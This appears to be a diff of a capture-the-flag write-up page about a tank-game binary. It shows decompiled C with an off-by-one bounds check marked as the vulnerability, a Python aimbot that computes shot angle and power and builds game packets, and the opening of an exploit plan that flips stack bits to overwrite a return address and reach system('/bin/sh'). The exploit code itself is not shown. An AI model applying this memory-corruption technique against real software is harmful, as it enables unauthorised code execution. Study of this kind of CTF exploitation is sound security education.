+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>	<span style="color:#8be9fd">bool</span> effect; <span style="color:#6272a4">// [rsp+2Ch] [rbp-1Ch]
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#6272a4"></span>	<span style="color:#8be9fd">int</span> r; <span style="color:#6272a4">// [rsp+34h] [rbp-14h]
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#6272a4"></span>	<span style="color:#8be9fd">signed</span> <span style="color:#8be9fd">int</span> j; <span style="color:#6272a4">// [rsp+38h] [rbp-10h]
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#6272a4"></span>	<span style="color:#8be9fd">signed</span> <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+3Ch] [rbp-Ch]
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#6272a4"></span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>	r <span style="color:#ff79c6">=</span> WEAPON_EXPLOSION_RADIUS[weapon];
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>	effect <span style="color:#ff79c6">=</span> weapon <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">2</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>	<span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> y <span style="color:#ff79c6">-</span> r; y <span style="color:#ff79c6">+</span> r <span style="color:#ff79c6">&gt;=</span> i; <span style="color:#ff79c6">++</span>i )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>	{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>		<span style="color:#ff79c6">for</span> ( j <span style="color:#ff79c6">=</span> x <span style="color:#ff79c6">-</span> r; x <span style="color:#ff79c6">+</span> r <span style="color:#ff79c6">&gt;=</span> j; <span style="color:#ff79c6">++</span>j )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>		{
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>			<span style="color:#ff79c6">if</span> ( (i <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> i <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">480</span>) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#6272a4">// Vulnerability
+</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span style="color:#6272a4"></span>				 (j <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> j <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">639</span>) <span style="color:#ff79c6">&amp;&amp;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>				 ((j <span style="color:#ff79c6">-</span> x) <span style="color:#ff79c6">*</span> (j <span style="color:#ff79c6">-</span> x) <span style="color:#ff79c6">+</span> (i <span style="color:#ff79c6">-</span> y) <span style="color:#ff79c6">*</span> (i <span style="color:#ff79c6">-</span> y) <span style="color:#ff79c6">&lt;=</span> r <span style="color:#ff79c6">*</span> r )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>			   ){
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>				PutPixel(map, j, i, effect);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>			}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>		}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>	}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>	<span style="color:#ff79c6">return</span> ApplyGravitationToMap(map, (x <span style="color:#ff79c6">-</span> r), (r <span style="color:#ff79c6">+</span> x));
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span style="color:#6272a4">/* Modifies Colors in MAP at bit level */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">PutPixel</span>(
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>	<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>MAP,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>	<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> x,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>	<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> y,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>	<span style="color:#8be9fd">char</span> color
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>	<span style="color:#ff79c6">__int64</span> result; <span style="color:#6272a4">// rax
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span style="color:#6272a4"></span>	<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> v5; <span style="color:#6272a4">// [rsp+20h] [rbp-4h]
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span style="color:#6272a4"></span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span>	<span style="color:#ff79c6">if</span> ( x <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">639</span> <span style="color:#ff79c6">&amp;&amp;</span> y <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">480</span> )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span>	{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span>		v5 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">640</span> <span style="color:#ff79c6">*</span> y <span style="color:#ff79c6">+</span> x;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span>		MAP[v5 <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">&amp;=</span> <span style="color:#ff79c6">~</span>(<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> (v5 <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">7</span>));
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span>		result <span style="color:#ff79c6">=</span> MAP[v5 <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">3</span>];
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span>		LOBYTE(result) <span style="color:#ff79c6">=</span> ((color <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">&lt;&lt;</span> (v5 <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">7</span>)) <span style="color:#ff79c6">|</span> result;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span>		MAP[v5 <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> result;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span>	}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span>	<span style="color:#ff79c6">return</span> result;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span>}
+</code></pre></div><p>Did you spot the Vulnerability?</p>
 <p>The vulnerability here is in the <strong>ApplyExplosionToMap()</strong>. If you see line 20
 We can see that the boundary check for <strong>i</strong> is done incorrectly. The boundary
 for <strong>i</strong> should&rsquo;ve been <strong>i &gt;= 0 &amp;&amp; i &lt;= 479</strong>, instead it is <strong>i &gt;= 0 &amp;&amp; i &lt;= 480</strong>.</p>
@@ -879,123 +597,61 @@ given by,</p>
 <p>Using the above expression for the initial velocity we can try a bunch of angles in the
 range of 0-90 degrees for which we get initial velocity under 100 because that is our
 limit for <strong>Power</strong>.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> math <span style="color:#ff79c6">import</span> sqrt, sin, cos, radians <span style="color:#ff79c6">as</span> rd, degrees <span style="color:#ff79c6">as</span> dg
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">GetAim</span>(d, h):
-    g <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">9.8</span>
-
-    <span style="color:#ff79c6">for</span> angle <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">90</span>, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>):
-        root <span style="color:#ff79c6">=</span> ((g <span style="color:#ff79c6">*</span> d <span style="color:#ff79c6">*</span> d)<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>)
-        root <span style="color:#ff79c6">/=</span> (d <span style="color:#ff79c6">*</span> <span style="color:#8be9fd;font-style:italic">abs</span>(sin(rd(angle))) <span style="color:#ff79c6">*</span> cos(rd(angle)) <span style="color:#ff79c6">-</span> h <span style="color:#ff79c6">*</span> (cos(rd(angle)) <span style="color:#ff79c6">**</span> <span style="color:#bd93f9">2</span>))
-        power <span style="color:#ff79c6">=</span> sqrt(root)
-        angle <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">180</span> <span style="color:#ff79c6">-</span> angle
-        <span style="color:#ff79c6">if</span> power <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">100.0</span> <span style="color:#ff79c6">and</span> power <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">10.0</span>:
-            <span style="color:#ff79c6">return</span> power, angle
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">CreateAimbotPacket</span>(tanks):
-    xa <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank1<span style="color:#ff79c6">.</span>x
-    xb <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank2<span style="color:#ff79c6">.</span>x
-    ya <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank1<span style="color:#ff79c6">.</span>y
-    yb <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank2<span style="color:#ff79c6">.</span>y
-    d <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">abs</span>(xa <span style="color:#ff79c6">-</span> xb)
-    h <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">abs</span>(ya <span style="color:#ff79c6">-</span> yb)
-    power, angle <span style="color:#ff79c6">=</span> GetAim(d, h)
-    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;AIM at (</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">, </span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">)&#34;</span> <span style="color:#ff79c6">%</span> (xb, yb))
-    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;angle: </span><span style="color:#f1fa8c">%f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> angle)
-    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;power: </span><span style="color:#f1fa8c">%f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> power)
-    <span style="color:#ff79c6">return</span> CreatePacket(<span style="color:#bd93f9">1</span>, power, angle)
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">FireAt</span>(weapon, x, y, tanks, debug):
-    xa <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank1<span style="color:#ff79c6">.</span>x
-    xb <span style="color:#ff79c6">=</span> x
-    ya <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank1<span style="color:#ff79c6">.</span>y
-    yb <span style="color:#ff79c6">=</span> y
-    d  <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">abs</span>(xa <span style="color:#ff79c6">-</span> xb)
-    h  <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">abs</span>(ya <span style="color:#ff79c6">-</span> yb)
-    P,A<span style="color:#ff79c6">=</span> GetAim(d, h)
-    <span style="color:#ff79c6">if</span> debug:
-        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;AIM at (</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">, </span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">)&#34;</span> <span style="color:#ff79c6">%</span> (x, y))
-        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;angle: </span><span style="color:#f1fa8c">%f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> A)
-        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;power: </span><span style="color:#f1fa8c">%f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> P)
-    <span style="color:#ff79c6">return</span> CreatePacket(weapon, P, A)
-</code></pre></td></tr></table>
-</div>
-</div><p>These functions were working fine but eventually we would miss our shot and the other tank hits a bullseye, in this situation we can never kill him because the <strong>MAP</strong> was generated in a way that when we hit him once, he falls in the hole created by the explosion and when we adjust our aim, our bullet collides with a mountain peak instead of colliding with the <strong>Red Tank</strong>. We don&rsquo;t account for any obstruction on the trajectory of the bullet. Sometimes our bullet is obstructed by a mountain or maybe we cannot hit him because of our terrible spawn location, sometimes we spawn at a very steep slope so its not possible to aim at the <strong>Red Tank</strong>. He will keep hitting us and we will always die before him no matter what. So, if we miss even once, we loose the battle and we have to start from scratch and this is what makes this exploit a little unreliable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">from</span> math <span style="color:#ff79c6">import</span> sqrt, sin, cos, radians <span style="color:#ff79c6">as</span> rd, degrees <span style="color:#ff79c6">as</span> dg
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">GetAim</span>(d, h):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    g <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">9.8</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    <span style="color:#ff79c6">for</span> angle <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">90</span>, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>        root <span style="color:#ff79c6">=</span> ((g <span style="color:#ff79c6">*</span> d <span style="color:#ff79c6">*</span> d)<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>        root <span style="color:#ff79c6">/=</span> (d <span style="color:#ff79c6">*</span> <span style="color:#8be9fd;font-style:italic">abs</span>(sin(rd(angle))) <span style="color:#ff79c6">*</span> cos(rd(angle)) <span style="color:#ff79c6">-</span> h <span style="color:#ff79c6">*</span> (cos(rd(angle)) <span style="color:#ff79c6">**</span> <span style="color:#bd93f9">2</span>))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>        power <span style="color:#ff79c6">=</span> sqrt(root)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>        angle <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">180</span> <span style="color:#ff79c6">-</span> angle
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>        <span style="color:#ff79c6">if</span> power <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">100.0</span> <span style="color:#ff79c6">and</span> power <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">10.0</span>:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>            <span style="color:#ff79c6">return</span> power, angle
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">CreateAimbotPacket</span>(tanks):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>    xa <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank1<span style="color:#ff79c6">.</span>x
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>    xb <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank2<span style="color:#ff79c6">.</span>x
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>    ya <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank1<span style="color:#ff79c6">.</span>y
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>    yb <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank2<span style="color:#ff79c6">.</span>y
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>    d <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">abs</span>(xa <span style="color:#ff79c6">-</span> xb)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>    h <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">abs</span>(ya <span style="color:#ff79c6">-</span> yb)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>    power, angle <span style="color:#ff79c6">=</span> GetAim(d, h)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;AIM at (</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">, </span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">)&#34;</span> <span style="color:#ff79c6">%</span> (xb, yb))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;angle: </span><span style="color:#f1fa8c">%f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> angle)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;power: </span><span style="color:#f1fa8c">%f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> power)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>    <span style="color:#ff79c6">return</span> CreatePacket(<span style="color:#bd93f9">1</span>, power, angle)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">FireAt</span>(weapon, x, y, tanks, debug):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>    xa <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank1<span style="color:#ff79c6">.</span>x
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>    xb <span style="color:#ff79c6">=</span> x
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>    ya <span style="color:#ff79c6">=</span> tanks<span style="color:#ff79c6">.</span>tank1<span style="color:#ff79c6">.</span>y
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>    yb <span style="color:#ff79c6">=</span> y
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>    d  <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">abs</span>(xa <span style="color:#ff79c6">-</span> xb)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>    h  <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">abs</span>(ya <span style="color:#ff79c6">-</span> yb)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>    P,A<span style="color:#ff79c6">=</span> GetAim(d, h)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>    <span style="color:#ff79c6">if</span> debug:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;AIM at (</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">, </span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">)&#34;</span> <span style="color:#ff79c6">%</span> (x, y))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;angle: </span><span style="color:#f1fa8c">%f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> A)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;power: </span><span style="color:#f1fa8c">%f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> P)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>    <span style="color:#ff79c6">return</span> CreatePacket(weapon, P, A)
+</code></pre></div><p>These functions were working fine but eventually we would miss our shot and the other tank hits a bullseye, in this situation we can never kill him because the <strong>MAP</strong> was generated in a way that when we hit him once, he falls in the hole created by the explosion and when we adjust our aim, our bullet collides with a mountain peak instead of colliding with the <strong>Red Tank</strong>. We don&rsquo;t account for any obstruction on the trajectory of the bullet. Sometimes our bullet is obstructed by a mountain or maybe we cannot hit him because of our terrible spawn location, sometimes we spawn at a very steep slope so its not possible to aim at the <strong>Red Tank</strong>. He will keep hitting us and we will always die before him no matter what. So, if we miss even once, we loose the battle and we have to start from scratch and this is what makes this exploit a little unreliable.</p>
 <h3 id="the-exploit">The Exploit</h3>
 <p>The exploitation is easy now, we have to build a primitive to do manipulate bits arbitrarily on the stack. Using this primitive we can overwrite the return address and redirect code execution. We already have a call to <strong>system(&quot;/bin/sh&quot;)</strong> in the executable itself and we also have the <strong>PIE</strong> base address. Using these two values we can get the address where will jump to get code execution.</p>
 <p>If we take a look at the code where it checks if the <strong>Red Tank</strong> is alive or dead? we can see that if we defeat the <strong>Red Tank</strong>, then the <strong>MAP</strong> is ours to play with. We can do anything on the <strong>MAP</strong>.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
